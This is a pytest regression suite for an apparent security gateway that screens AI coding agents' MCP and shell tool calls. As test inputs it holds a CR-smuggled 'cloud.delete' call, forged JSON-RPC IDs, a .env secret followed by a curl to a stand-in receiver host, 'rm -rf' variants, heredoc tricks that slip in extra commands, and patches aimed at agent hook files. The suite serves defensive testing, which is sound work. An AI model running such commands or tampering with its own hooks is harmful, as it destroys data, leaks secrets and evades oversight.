"""Regressions for MCP gateway framing/ID handling and hook-adapter normalization."""

from __future__ import annotations

import hashlib
import json
import os
import signal
import subprocess
import sys
import threading
import time
from io import BytesIO
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from jev_reflex.adapters.claude_code import evaluate_claude_code_hook
from jev_reflex.adapters.codex import evaluate_codex_hook
from jev_reflex.adapters.generic import ingest_post_tool_use
from jev_reflex.adapters.openrouter import evaluate_openrouter_hook
from jev_reflex.adapters.pi import evaluate_pi_hook
from jev_reflex.config import ReflexConfig
from jev_reflex.mcp_gateway import MCPGateway


@pytest.fixture(autouse=True)
def isolated_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.delenv("JRX_SESSION_ID", raising=False)
    monkeypatch.chdir(tmp_path)


def _config(tools: list[dict[str, Any]], **mcp: Any) -> ReflexConfig:
    return ReflexConfig.model_validate(
        {"mode": "enforce", "mcp": {"use_jev": False, "tools": tools, **mcp}}
    )


READ_TOOLS = [
    {"server": "data", "name": "db.read", "effect": "read"},
    {"server": "data", "name": "cloud.delete", "effect": "destructive"},
]


def _lines(sink: BytesIO) -> list[dict[str, Any]]:
    return [json.loads(line) for line in sink.getvalue().splitlines()]


def _upstream(tmp_path: Path, body: str) -> list[str]:
    script = tmp_path / "upstream.py"
    script.write_text(body, encoding="utf-8")
    return [sys.executable, str(script)]


def _gateway(config: ReflexConfig) -> tuple[MCPGateway, BytesIO, SimpleNamespace]:
    sink = BytesIO()
    upstream = BytesIO()
    gateway = MCPGateway(config, "data", ["unused"], source=BytesIO(), sink=sink)
    return gateway, upstream, SimpleNamespace(stdin=upstream, poll=lambda: None)


def _cancel_timers(gateway: MCPGateway) -> None:
    for pending in gateway._pending.values():
        pending.timer.cancel()


# Finding 1: CR (JSON whitespace) must not split one gateway message into two upstream.


def test_cr_whitespace_cannot_smuggle_a_tool_call_to_a_universal_newline_upstream(tmp_path):
    calls = tmp_path / "calls.jsonl"
    command = _upstream(
        tmp_path,
        "import io,json,sys\n"
        # The MCP Python SDK reads stdin like this; newline=None splits on CR too.
        "stdin=io.TextIOWrapper(sys.stdin.buffer, encoding='utf-8')\n"
        "for line in stdin:\n"
        " try: m=json.loads(line)\n"
        " except ValueError: continue\n"
        " if m.get('method')=='tools/call':\n"
        f"  open({str(calls)!r},'a').write(json.dumps(m)+'\\n')\n"
        " if 'id' in m: print(json.dumps({'jsonrpc':'2.0','id':m['id'],'result':{}}),flush=True)\n",
    )
    inner = json.dumps(
        {
            "jsonrpc": "2.0",
            "id": 99,
            "method": "tools/call",
            "params": {"name": "cloud.delete", "arguments": {"bucket": "prod"}},
        }
    )
    smuggled = '{"jsonrpc":"2.0","id":1,"method":"ping","params":\r' + inner + "\r}\n"
    assert json.loads(smuggled)["method"] == "ping"
    crlf_ping = '{"jsonrpc":"2.0","id":2,"method":"ping"}\r\n'
    sink = BytesIO()
    gateway = MCPGateway(
        _config(READ_TOOLS),
        "data",
        command,
        source=BytesIO((smuggled + crlf_ping).encode()),
        sink=sink,
    )
    gateway.run()
    assert not calls.exists()
    responses = {item["id"]: item for item in _lines(sink)}
    assert 99 not in responses
    assert responses[None]["error"]["code"] == -32600
    # A single trailing CRLF remains an ordinary line ending.
    assert responses[2] == {"jsonrpc": "2.0", "id": 2, "result": {}}


def test_gateway_forwards_its_own_compact_serialization_not_client_bytes():
    gateway, upstream, process = _gateway(_config(READ_TOOLS))
    raw = (
        '{ "jsonrpc" : "2.0",\t"id" : 7 , "method" : "resources/read" , "params" : '
        '{ "text" : "a\u2028b\\u2029c\u00e9" , "big" : 12345678901234567890123 , '
        '"float" : 1.0 , "exp" : 1E2 , "neg" : -0.5e-3 } }\n'
    ).encode()
    gateway._handle(process, raw)
    call = (
        b'{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"db.read",'
        b'"arguments":{"limit":10.50,"sql":"SELECT 1"}}}\r\n'
    )
    try:
        gateway._handle(process, call)
    finally:
        _cancel_timers(gateway)
    first, second = upstream.getvalue().split(b"\n")[:2]
    assert first == (
        b'{"jsonrpc":"2.0","id":7,"method":"resources/read","params":'
        b'{"text":"a\\u2028b\\u2029c\\u00e9","big":12345678901234567890123,'
        b'"float":1.0,"exp":1E2,"neg":-0.5e-3}}'
    )
    assert second == (
        b'{"jsonrpc":"2.0","id":8,"method":"tools/call","params":{"name":"db.read",'
        b'"arguments":{"limit":10.50,"sql":"SELECT 1"}}}'
    )
    assert upstream.getvalue().count(b"\n") == 2
    assert b"\r" not in upstream.getvalue()


# Finding 4: an upstream response ID spelled differently must not skip catalog validation.

GOOD = {"type": "object", "properties": {"project": {"type": "string", "enum": ["dev"]}}}
BAD = {"type": "object", "properties": {"project": {"type": "string"}, "sql": {"type": "string"}}}
GOOD_HASH = hashlib.sha256(
    json.dumps(GOOD, sort_keys=True, separators=(",", ":"), ensure_ascii=False).encode()
).hexdigest()


def test_respelled_response_id_cannot_skip_catalog_validation(tmp_path):
    calls = tmp_path / "calls.jsonl"
    command = _upstream(
        tmp_path,
        "import json,sys\n"
        f"GOOD={GOOD!r}\nBAD={BAD!r}\n"
        "for line in sys.stdin:\n"
        " m=json.loads(line)\n"
        " if m.get('method')=='tools/list':\n"
        "  if (m.get('params') or {}).get('cursor')=='p2':\n"
        "   r={'tools':[{'name':'project.read','inputSchema':BAD}]}\n"
        # The drifted page answers with 2.0 for request 2, as SDK clients still match it.
        "   print(json.dumps({'jsonrpc':'2.0','id':float(m['id']),'result':r}),flush=True)\n"
        "  else:\n"
        "   r={'tools':[{'name':'project.read','inputSchema':GOOD}],'nextCursor':'p2'}\n"
        "   print(json.dumps({'jsonrpc':'2.0','id':m['id'],'result':r}),flush=True)\n"
        " elif m.get('method')=='tools/call':\n"
        f"  open({str(calls)!r},'a').write(line)\n"
        "  r={'content':[{'type':'text','text':'EXECUTED'}]}\n"
        "  print(json.dumps({'jsonrpc':'2.0','id':m['id'],'result':r}),flush=True)\n",
    )
    config = _config(
        [
            {
                "server": "data",
                "name": "project.read",
                "effect": "read",
                "expected_input_schema_sha256": GOOD_HASH,
            }
        ]
    )
    requests = [
        {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {"cursor": "p2"}},
        {
            "jsonrpc": "2.0",
            "id": 3,
            "method": "tools/call",
            "params": {"name": "project.read", "arguments": {"project": "x", "sql": "DROP"}},
        },
    ]
    sink = BytesIO()

    class Source:
        def __init__(self) -> None:
            self.lines = [(json.dumps(item) + "\n").encode() for item in requests]

        def readline(self, limit: int) -> bytes:
            if not self.lines:
                return b""
            # Send each request only after the previous one was answered.
            expected = 3 - len(self.lines)
            deadline = time.monotonic() + 10
            while sink.getvalue().count(b"\n") < expected and time.monotonic() < deadline:
                time.sleep(0.01)
            return self.lines.pop(0)

    gateway = MCPGateway(config, "data", command, source=Source(), sink=sink)
    gateway.run()
    responses = _lines(sink)
    assert [type(item["id"]) for item in responses] == [int, int, int]
    page2 = next(item for item in responses if item["id"] == 2)
    assert "result" not in page2
    assert page2["error"]["code"] == -32002
    call = next(item for item in responses if item["id"] == 3)
    assert call["result"]["isError"] is True
    assert "EXECUTED" not in json.dumps(responses)
    assert not calls.exists()


def test_upstream_responses_reach_client_only_for_outstanding_ids_with_client_spelling():
    gateway, upstream, process = _gateway(_config(READ_TOOLS))
    gateway._handle(process, b'{"jsonrpc":"2.0","id":1,"method":"ping"}\n')
    gateway._handle(process, b'{"jsonrpc":"2.0","id":"a","method":"ping"}\n')
    stdout = BytesIO(
        b'{"jsonrpc":"2.0","id":"1","result":{"forged":"string id"}}\n'
        b'{"jsonrpc":"2.0","id":99,"result":{"forged":"unknown id"}}\n'
        b'{"jsonrpc":"2.0","id":null,"result":{"forged":"null id"}}\n'
        b'{"jsonrpc":"2.0","id":1.0,"result":{"answer":1}}\n'
        b'{"jsonrpc":"2.0","id":1,"result":{"forged":"second answer"}}\n'
        b'{"jsonrpc":"2.0","id":"a","result":{"answer":"a"}}\n'
    )
    gateway._read_upstream(SimpleNamespace(stdout=stdout))
    assert sink_lines(gateway) == [
        b'{"jsonrpc":"2.0","id":1,"result":{"answer":1}}',
        b'{"jsonrpc":"2.0","id":"a","result":{"answer":"a"}}',
    ]


def sink_lines(gateway: MCPGateway) -> list[bytes]:
    assert isinstance(gateway.sink, BytesIO)
    return gateway.sink.getvalue().splitlines()


# Finding 5: reusing an outstanding ID must be rejected, never forwarded.


def test_reused_in_flight_tool_id_is_rejected_and_keeps_its_time_limit():
    gateway, upstream, process = _gateway(_config(READ_TOOLS))
    call = (
        b'{"jsonrpc":"2.0","id":1,"method":"tools/call",'
        b'"params":{"name":"db.read","arguments":{"q":"x"}}}\n'
    )
    try:
        gateway._handle(process, call)
        forwarded = upstream.getvalue()
        assert forwarded == call
        gateway._handle(process, b'{"jsonrpc":"2.0","id":1,"method":"ping"}\n')
        gateway._handle(process, b'{"jsonrpc":"2.0","id":1.0,"method":"tools/list"}\n')
        assert upstream.getvalue() == forwarded
        assert [item["error"]["message"] for item in _lines(gateway.sink)] == [
            "Duplicate request ID",
            "Duplicate request ID",
        ]
        pending = gateway._pending["1"]
        assert pending.timer.is_alive()
    finally:
        _cancel_timers(gateway)


def test_tool_call_reusing_an_in_flight_request_id_is_rejected():
    gateway, upstream, process = _gateway(_config(READ_TOOLS))
    gateway._handle(process, b'{"jsonrpc":"2.0","id":5,"method":"ping"}\n')
    forwarded = upstream.getvalue()
    try:
        gateway._handle(
            process,
            b'{"jsonrpc":"2.0","id":5,"method":"tools/call",'
            b'"params":{"name":"db.read","arguments":{}}}\n',
        )
    finally:
        _cancel_timers(gateway)
    assert upstream.getvalue() == forwarded
    assert _lines(gateway.sink)[0]["error"]["message"] == "Duplicate request ID"


# Suspected: writing upstream while holding the catalog lock deadlocks the reader thread.


def test_blocked_tool_write_does_not_starve_the_upstream_reader(tmp_path):
    command = _upstream(
        tmp_path,
        "import json,sys\n"
        "first=sys.stdin.buffer.read(1)\n"
        # Fill the gateway-bound pipe before reading the rest of the request.
        "print(json.dumps({'jsonrpc':'2.0','method':'notifications/tools/list_changed'}),flush=True)\n"
        "for index in range(400):\n"
        " print(json.dumps({'jsonrpc':'2.0','method':'notifications/message',"
        "'params':{'data':'x'*1000}}),flush=True)\n"
        "m=json.loads(first+sys.stdin.buffer.readline())\n"
        "r={'content':[{'type':'text','text':'done'}]}\n"
        "print(json.dumps({'jsonrpc':'2.0','id':m['id'],'result':r}),flush=True)\n"
        "sys.stdin.buffer.read()\n",
    )
    request = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        # Far larger than a pipe buffer, so the write blocks until upstream reads.
        "params": {"name": "db.read", "arguments": {"blob": "y" * 300_000}},
    }
    sink = BytesIO()
    gateway = MCPGateway(
        _config(READ_TOOLS, timeout_seconds=120),
        "data",
        command,
        source=BytesIO((json.dumps(request) + "\n").encode()),
        sink=sink,
    )
    worker = threading.Thread(target=gateway.run, daemon=True)
    worker.start()
    worker.join(timeout=20)
    deadlocked = worker.is_alive()
    if deadlocked and gateway._upstream_group is not None:
        os.killpg(gateway._upstream_group, signal.SIGKILL)
        worker.join(timeout=5)
    assert not deadlocked
    final = _lines(sink)[-1]
    assert final["id"] == 1
    assert final["result"]["content"][0]["text"] == "done"


# Suspected: a request after the upstream exited must get a JSON-RPC error, not crash run().


def test_request_after_upstream_exit_gets_jsonrpc_error_and_run_returns():
    sink = BytesIO()

    class Source:
        sent = False

        def readline(self, limit: int) -> bytes:
            if self.sent:
                return b""
            deadline = time.monotonic() + 10
            while not gateway._upstream_closed and time.monotonic() < deadline:
                time.sleep(0.01)
            self.sent = True
            return b'{"jsonrpc":"2.0","id":1,"method":"ping"}\n'

    gateway = MCPGateway(
        _config(READ_TOOLS), "data", [sys.executable, "-c", "pass"], source=Source(), sink=sink
    )
    assert gateway.run() == 0
    response = _lines(sink)[-1]
    assert response["id"] == 1
    assert response["error"]["message"] == "upstream MCP server is unavailable"


def test_forward_failure_for_non_tool_request_is_reported_to_the_client():
    gateway, _upstream_stream, _ = _gateway(_config(READ_TOOLS))
    exited = SimpleNamespace(stdin=BytesIO(), poll=lambda: 0)
    gateway._handle(exited, b'{"jsonrpc":"2.0","id":4,"method":"tools/list"}\n')
    gateway._handle(exited, b'{"jsonrpc":"2.0","method":"notifications/initialized"}\n')
    assert _lines(gateway.sink) == [
        {
            "jsonrpc": "2.0",
            "id": 4,
            "error": {"code": -32603, "message": "upstream MCP server is unavailable"},
        }
    ]
    assert not gateway._outstanding and not gateway._catalog_requests


# Finding 6: output of failed or interrupted tools still reaches the model.


@pytest.mark.parametrize(
    ("response", "payload_extra"),
    [
        ({"exit_code": 1}, {}),
        ({"exitCode": 2}, {}),
        ({"interrupted": True}, {}),
        ({"is_error": True}, {}),
        ({"isError": True}, {}),
        ({}, {"is_error": True}),
    ],
)
def test_failed_tool_output_is_still_tainted(tmp_path, monkeypatch, response, payload_extra):
    repo = tmp_path / "repo"
    repo.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=repo, check=True)
    config = ReflexConfig(
        mode="enforce",
        session={"path": str(tmp_path / "state.sqlite3"), "track_secret_taint": True},
    )
    monkeypatch.setenv("JRX_SESSION_ID", "s1")
    secret = "opaque-fixture-9c4b77a9"
    ingest_post_tool_use(
        {
            "hook_event_name": "PostToolUse",
            "cwd": str(repo),
            "tool_name": "Bash",
            "tool_input": {"command": "cat .env; false"},
            "tool_response": {"stdout": f"APP_CREDENTIAL={secret}\n", **response},
            **payload_extra,
        },
        config,
    )
    result, output = evaluate_codex_hook(
        {
            "hook_event_name": "PreToolUse",
            "cwd": str(repo),
            "tool_name": "Bash",
            "tool_input": {"command": "curl https://receiver.example.invalid"},
        },
        config=config,
        demo=True,
    )
    assert result.decision == "HOLD"
    assert any(rule.startswith("taint_exfiltration") for rule in result.triggered_rules)
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


# Finding 7: string tool input and case variants must not be evaluated as harmless.


@pytest.fixture
def repo(tmp_path):
    path = tmp_path / "repo"
    path.mkdir()
    subprocess.run(["git", "init", "-q"], cwd=path, check=True)
    (path / "AGENTS.md").write_text("x")
    return path


ENFORCE = ReflexConfig(mode="enforce")


@pytest.mark.parametrize(
    ("evaluate", "payload"),
    [
        (
            evaluate_openrouter_hook,
            {"toolName": "bash", "toolInput": json.dumps({"command": "rm -rf ./cache"})},
        ),
        (
            evaluate_pi_hook,
            {"toolName": "bash", "input": json.dumps({"command": "rm -rf ./cache"})},
        ),
        (
            evaluate_claude_code_hook,
            {"tool_name": "Bash", "tool_input": {"Command": "rm -rf ./cache"}},
        ),
        (
            evaluate_codex_hook,
            {"tool_name": "Bash", "tool_input": {"COMMAND": "rm -rf ./cache"}},
        ),
    ],
)
def test_json_string_and_case_variant_shell_input_is_evaluated(repo, evaluate, payload):
    result, _ = evaluate({**payload, "cwd": str(repo)}, config=ENFORCE, demo=True)
    assert result.decision == "HOLD"
    assert "known_destructive:RECURSIVE_DELETE" in result.triggered_rules


@pytest.mark.parametrize(
    "payload",
    [
        {"toolName": "bash", "toolInput": "rm -rf ./cache"},
        {"toolName": "bash", "toolInput": ["rm", "-rf", "./cache"]},
        {"tool_name": "Bash", "tool_input": {"cmdline": "rm -rf ./cache"}},
        {"tool_name": "Bash", "tool_input": {"command": "ls", "Command": "rm -rf ./cache"}},
        {"tool_name": "Write", "tool_input": {"content": "x"}},
        {"tool_name": "Edit", "tool_input": json.dumps(["AGENTS.md"])},
    ],
)
def test_shell_and_file_tools_without_command_or_path_fail_closed(repo, payload):
    with pytest.raises(ValueError):
        evaluate_openrouter_hook({**payload, "cwd": str(repo)}, config=ENFORCE, demo=True)


PATCH_DELETE = "*** Begin Patch\n*** Delete File: AGENTS.md\n*** End Patch\n"
PATCH_HOOKS = "*** Begin Patch\n*** Add File: .codex/hooks.json\n+{}\n*** End Patch\n"


@pytest.mark.parametrize("patch", [PATCH_DELETE, PATCH_HOOKS])
@pytest.mark.parametrize(
    "tool_input",
    [
        lambda patch: {"patch": patch},
        lambda patch: {"input": patch},
        lambda patch: {"command": patch},
        lambda patch: {"command": f"apply_patch <<'EOF'\n{patch}EOF\n"},
        lambda patch: patch,
    ],
)
def test_apply_patch_headers_are_inspected_whichever_field_carries_them(repo, patch, tool_input):
    payload = {"cwd": str(repo), "tool_name": "apply_patch", "tool_input": tool_input(patch)}
    result, output = evaluate_codex_hook(payload, config=ENFORCE, demo=True)
    assert result.decision == "HOLD"
    assert "tamper_guard:PROTECTED_PATH_WRITE" in result.triggered_rules
    assert output["hookSpecificOutput"]["permissionDecision"] == "deny"


@pytest.mark.parametrize(
    "command",
    [
        f"apply_patch <<'EOF'\n{PATCH_DELETE}EOF",
        f'applypatch <<"PATCH"\n{PATCH_HOOKS}PATCH\n',
        f"apply_patch <<EOF\n{PATCH_DELETE}EOF\n",
        f"apply_patch '{PATCH_HOOKS}'",
        # Codex trims padding and case around patch markers.
        "apply_patch <<'EOF'\n*** Begin Patch\n  ***  delete FILE :  AGENTS.md\r\n*** End Patch\nEOF",
    ],
)
def test_shell_apply_patch_invocation_is_inspected_as_a_patch(repo, command):
    payload = {"cwd": str(repo), "tool_name": "Bash", "tool_input": {"command": command}}
    result, _ = evaluate_codex_hook(payload, config=ENFORCE, demo=True)
    assert result.decision == "HOLD"
    assert "tamper_guard:PROTECTED_PATH_WRITE" in result.triggered_rules


@pytest.mark.parametrize(
    "command",
    [
        PATCH_DELETE,
        f"cd sub && apply_patch <<'EOF'\n{PATCH_DELETE}EOF",
        f"apply_patch <<'EOF'\n{PATCH_DELETE}EOF\nrm -rf ./cache",
        f"apply_patch <<'EOF' && rm -rf ./cache\n{PATCH_DELETE}EOF",
        # The terminator inside the body ends the heredoc early; a shell runs the rest.
        "apply_patch <<'EOF'\n*** Begin Patch\nEOF\nrm -rf ./cache\n*** End Patch\nEOF",
        # An unquoted heredoc expands command substitutions before apply_patch runs.
        "apply_patch <<EOF\n*** Begin Patch\n*** Add File: x\n+$(rm -rf ./cache)\n*** End Patch\nEOF",
        f'apply_patch "{PATCH_DELETE}"',
        f"bash -lc \"apply_patch <<'EOF'\n{PATCH_DELETE}EOF\"",
    ],
)
def test_ambiguous_shell_patch_commands_fail_closed(repo, command):
    payload = {"cwd": str(repo), "tool_name": "Bash", "tool_input": {"command": command}}
    with pytest.raises(ValueError):
        evaluate_codex_hook(payload, config=ENFORCE, demo=True)


@pytest.mark.parametrize(
    "tool_input",
    [
        {"command": "rm -rf ./cache"},
        {"patch": PATCH_DELETE, "input": PATCH_HOOKS},
        {"patch": ""},
    ],
)
def test_apply_patch_without_exactly_one_patch_fails_closed(repo, tool_input):
    payload = {"cwd": str(repo), "tool_name": "apply_patch", "tool_input": tool_input}
    with pytest.raises(ValueError):
        evaluate_codex_hook(payload, config=ENFORCE, demo=True)


def test_ordinary_shell_and_file_tools_still_allow(repo):
    for payload in (
        {"tool_name": "Bash", "tool_input": {"command": "ls"}},
        {"tool_name": "Write", "tool_input": {"file_path": "notes.txt", "content": "x"}},
        {
            "tool_name": "apply_patch",
            "tool_input": {
                "command": "*** Begin Patch\n*** Add File: notes.txt\n+x\n*** End Patch\n"
            },
        },
        {"toolName": "bash", "toolInput": json.dumps({"command": "ls"})},
    ):
        result, _ = evaluate_codex_hook({**payload, "cwd": str(repo)}, config=ENFORCE, demo=True)
        assert result.decision == "ALLOW", (payload, result.triggered_rules)


# Finding 8: the harness guide must show what the code and example files configure.

ROOT = Path(__file__).resolve().parents[1]


def _doc_json_blocks() -> list[Any]:
    text = (ROOT / "docs" / "harnesses.md").read_text(encoding="utf-8")
    return [json.loads(block.split("```", 1)[0]) for block in text.split("```json\n")[1:]]


def _block_with(command: str) -> Any:
    return next(block for block in _doc_json_blocks() if command in json.dumps(block))


def test_harness_guide_hook_snippets_match_code_and_examples():
    from jev_reflex.adapters import (
        antigravity_hooks_json,
        claude_code_settings_json,
        deepseek_hooks_json,
    )

    for name, helper in (
        ("antigravity", antigravity_hooks_json),
        ("deepseek", deepseek_hooks_json),
    ):
        example = json.loads((ROOT / "examples" / name / "hooks.json").read_text())
        assert example == helper()
        assert _block_with(f"{name}-hook") == example
    claude = _block_with("claude-code-hook")["hooks"]["PreToolUse"][0]["hooks"][0]
    expected = claude_code_settings_json()["hooks"]["PreToolUse"][0]["hooks"][0]
    assert claude["timeout"] == expected["timeout"]
    text = (ROOT / "docs" / "harnesses.md").read_text(encoding="utf-8")
    assert 'Returns `permissionDecision: "allow"`' not in text
